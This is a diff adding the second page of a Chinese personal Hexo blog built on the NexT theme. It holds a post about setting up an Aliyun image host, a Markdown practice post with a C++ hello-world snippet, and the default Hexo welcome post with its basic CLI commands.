+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>今天给图片创建了一个<strong>图床</strong><br>试试能不能正常的上传图片<br><del>正好有个朋友在垃圾桶捡到了个木头</del></p>
+<hr>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/%E5%9E%83%E5%9C%BE%E6%A1%B6%E6%9C%A8%E5%A4%B4.jpg" alt="勉强看一下"></h2><p>#####PS<br>为了这个破木头搞了一晚上，最后只能租了个阿里云<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230311225041.jpg" alt="救命"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/%E8%AF%95%E7%9D%80%E7%BB%83%E4%B9%A0%E4%B8%80%E4%B8%8Bmarkdown/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/10/%E8%AF%95%E7%9D%80%E7%BB%83%E4%B9%A0%E4%B8%80%E4%B8%8Bmarkdown/" class="post-title-link" itemprop="url">试着练习一下markdown</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-10 14:32:00" itemprop="dateCreated datePublished" datetime="2023-03-10T14:32:00+08:00">2023-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-13 23:50:57" itemprop="dateModified" datetime="2023-03-13T23:50:57+08:00">2023-03-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>329</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p><em>斜体</em> 一个*<br><strong>粗体</strong> 两个*<br><em><strong>又斜又粗</strong></em> 三个*</p>
+<p>一句话两个空格换行  两句话之间一个空格换行</p>
+<p>用&lt;br&#x2F;&gt;也能换行<br><br/></p>
+<blockquote>
+<p>试一下引用<br>换行不会结束引用</p>
+</blockquote>
+<p>用一个空白行结束了上面的引用</p>
+<p><a target="_blank" rel="noopener" href="https://zhm666666.github.io/">试一下连接</a><br>主页<a target="_blank" rel="noopener" href="https://zhm666666.github.io/">https://zhm666666.github.io</a></p>
+<p>图片练习先放着</p>
+<hr>
+<p>列表</p>
+<ul>
+<li>无序列表 1</li>
+<li>无序列表 2<ul>
+<li>无序列表 2.1</li>
+<li>无序列表 2.2</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>有序列表 1<br> 1.1 有序列表 1.1</li>
+<li>有序列表 2<br> 2.1 有序列表2.1</li>
+</ol>
+<p><del>删除线</del>用~~<br><u>下划线</u> 用&lt;u&gt;<br><code>hello world</code> 用反引号&#96;</p>
+<p>一串代码块</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/08/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-08 21:12:52" itemprop="dateCreated datePublished" datetime="2023-03-08T21:12:52+08:00">2023-03-08</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>367</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="？？喵！！"
+      src="/images/hearder.jpg">
+  <p class="site-author-name" itemprop="name">？？喵！！</p>
+  <div class="site-description" itemprop="description">瞄一下学过代码，写一个睡喵的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">？？喵！！</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">66k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:56</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
+
